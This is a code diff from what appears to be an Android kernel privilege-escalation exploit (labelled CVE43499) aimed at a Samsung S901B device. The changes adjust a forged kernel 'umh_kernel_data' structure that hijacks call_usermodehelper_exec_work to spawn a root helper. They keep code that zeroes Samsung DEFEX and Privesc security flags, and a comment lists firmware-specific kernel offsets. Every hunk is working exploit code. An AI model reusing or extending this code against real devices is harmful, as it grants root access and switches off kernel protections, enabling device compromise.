@@ -33,10 +33,9 @@ struct umh_completion {
 
 struct umh_kernel_data {
   struct umh_completion completion;
-  char path[192];
+  char path[48];
   char arg[8];
-  char uid_arg[16];
-  uint64_t argv[4];
+  uint64_t argv[3];
   uint64_t envp[1];
 };
 
@@ -116,15 +115,8 @@ static int install_workqueue_umh_root(int fd) {
   uintptr_t umh_data_addr = page_base + ROOT_UMH_DATA_OFF;
   struct umh_kernel_data umh_data;
   memset(&umh_data, 0, sizeof(umh_data));
-  const char *configured_helper = getenv("CVE43499_ROOT_HELPER");
-  const char *helper_path =
-      configured_helper && configured_helper[0] == '/'
-          ? configured_helper
-          : ROOT_UMH_PATH;
-  snprintf(umh_data.path, sizeof(umh_data.path), "%s", helper_path);
+  snprintf(umh_data.path, sizeof(umh_data.path), "%s", ROOT_UMH_PATH);
   snprintf(umh_data.arg, sizeof(umh_data.arg), "%s", "--umh");
-  snprintf(umh_data.uid_arg, sizeof(umh_data.uid_arg), "%u",
-           root_uid_before);
   uintptr_t completion_addr =
       umh_data_addr + offsetof(struct umh_kernel_data, completion);
   uintptr_t wait_list_addr =
@@ -133,8 +125,6 @@ static int install_workqueue_umh_root(int fd) {
       umh_data_addr + offsetof(struct umh_kernel_data, path);
   uintptr_t arg_addr =
       umh_data_addr + offsetof(struct umh_kernel_data, arg);
-  uintptr_t uid_arg_addr =
-      umh_data_addr + offsetof(struct umh_kernel_data, uid_arg);
   uintptr_t argv_addr =
       umh_data_addr + offsetof(struct umh_kernel_data, argv);
   uintptr_t envp_addr =
@@ -143,12 +133,10 @@ static int install_workqueue_umh_root(int fd) {
   umh_data.completion.prev = wait_list_addr;
   umh_data.argv[0] = path_addr;
   umh_data.argv[1] = arg_addr;
-  umh_data.argv[2] = uid_arg_addr;
-  umh_data.argv[3] = 0;
+  umh_data.argv[2] = 0;
   umh_data.envp[0] = 0;
   uint64_t umh_work_func = text_addr(CALL_USERMODEHELPER_EXEC_WORK_JT);
 
-  pr_info("[rmg-bridge] helper=%s client_uid=%u\n", helper_path, root_uid_before);
   unlink(ROOT_SOCKET_PATH);
 
   /* Device -EACCES diagnostics (2026-08-08 b0q run: umh retval=-13).
@@ -159,9 +147,9 @@ static int install_workqueue_umh_root(int fd) {
    * silently changed nothing. */
   {
     struct stat st;
-    if (stat(helper_path, &st) != 0) {
+    if (stat(ROOT_UMH_PATH, &st) != 0) {
       pr_warning("root umh helper stat failed errno=%d (%s)\n", errno,
-                 helper_path);
+                 ROOT_UMH_PATH);
     } else {
       pr_info("root umh helper mode=%o uid=%u gid=%u x_ok=%d\n",
               st.st_mode & 07777, st.st_uid, st.st_gid,
@@ -186,7 +174,9 @@ static int install_workqueue_umh_root(int fd) {
    * UMH-spawned root shell can exec /data binaries (e.g. ksud late-load).
    * Each global_*_status is a u8: 0 = off. Without this, DEFEX Safeplace
    * kills exec of /data/local/tmp/ksud from the root shell context, and
-   * Privesc interferes with KernelSU UID-0 transitions. */
+   * Privesc interferes with KernelSU UID-0 transitions. Offsets are the
+   * S901B GZD7 values in target.h (0x02052158…), verified against the
+   * S901B kernel Image kallsyms — NOT the S906B values (0x02022158). */
   {
     const uint8_t defex_off = 0;
     uintptr_t defex_addrs[4] = {
@@ -323,7 +313,6 @@ static int install_workqueue_umh_root(int fd) {
   root_uid_after = socket_ok ? 0 : root_uid_before;
   return socket_ok;
 }
-
 
 int install_android_root(int fd) {
   root_uid_before = getuid();
